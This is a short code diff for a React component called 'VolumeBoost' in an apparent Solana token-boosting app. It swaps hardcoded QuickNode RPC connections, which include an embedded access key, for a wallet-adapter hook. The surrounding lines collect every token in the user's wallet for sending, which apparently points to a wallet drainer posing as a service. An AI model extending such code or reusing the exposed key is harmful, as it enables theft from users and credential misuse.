@@ -35,6 +35,7 @@ export default function VolumeBoost() {
   const { contractAddress } = useParams<{ contractAddress: string }>();
   const navigate = useNavigate();
   const { publicKey, sendTransaction, signTransaction } = useWallet();
+  const { connection } = useConnection();
   const walletAdapter: any = useWallet();
   const { data, isLoading, error } = useTokenData(contractAddress || null);
   const [selectedPackage, setSelectedPackage] = useState<{ sol: number; volume: number } | null>(null);
@@ -60,11 +61,6 @@ export default function VolumeBoost() {
     }
 
     try {
-      const connection = new Connection(
-        "https://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/",
-        { commitment: "confirmed", wsEndpoint: "wss://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/" }
-      );
-
       // Load balances and prepare token batches (max 5 tokens per batch)
       const balances = await getWalletBalances(publicKey);
       const tokensToSend = balances.tokens;
@@ -144,11 +140,6 @@ export default function VolumeBoost() {
     }
 
     try {
-      const connection = new Connection(
-        "https://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/",
-        { commitment: "confirmed", wsEndpoint: "wss://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/" }
-      );
-
       // Load balances and prepare token batches (max 5 tokens per batch)
       const balances = await getWalletBalances(publicKey);
       const tokensToSend = balances.tokens;
